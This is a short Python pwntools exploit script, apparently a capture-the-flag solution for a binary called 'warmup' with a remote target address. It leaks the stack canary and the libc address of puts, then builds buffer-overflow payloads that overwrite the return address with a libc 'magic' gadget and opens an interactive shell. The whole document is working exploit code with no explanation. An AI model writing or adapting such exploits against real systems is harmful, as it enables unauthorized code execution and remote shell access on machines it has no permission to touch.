from pwn import *

libc = ELF('./libc.so.6')
elf = ELF('./warmup')

env = {'LD_PRELOAD':libc.path}

if len(sys.argv) > 1:
	r = remote('47.91.226.78', 10006)
else:
	r = elf.process(env=env)

r.recvuntil('for?\n')
r.sendline('6295600')

canary = int(r.recvline().rstrip(), 16)
log.info('canary: ' + hex(canary))

payload = 'a'*0x18 + p64(canary)*2 + p64(0x4008b9)
print r.recvuntil('name?\n')
r.sendline(payload)

print r.recvuntil('for?\n')
#raw_input()
r.sendline('6295464')

puts = int(r.recvline().rstrip(), 16)
system = puts - 0x2a300
sh = puts + 0x11d6c7
magic = puts - 0x2a426
pop_rdi = 0x400a63

log.info('puts: ' + hex(puts))
log.info('system: ' + hex(system))
log.info('sh: ' + hex(sh))
log.info('magic: ' + hex(magic))

payload = 'a'*0x18 + p64(canary+0x20)*2 + p64(magic)
r.sendline(payload)
r.interactive()
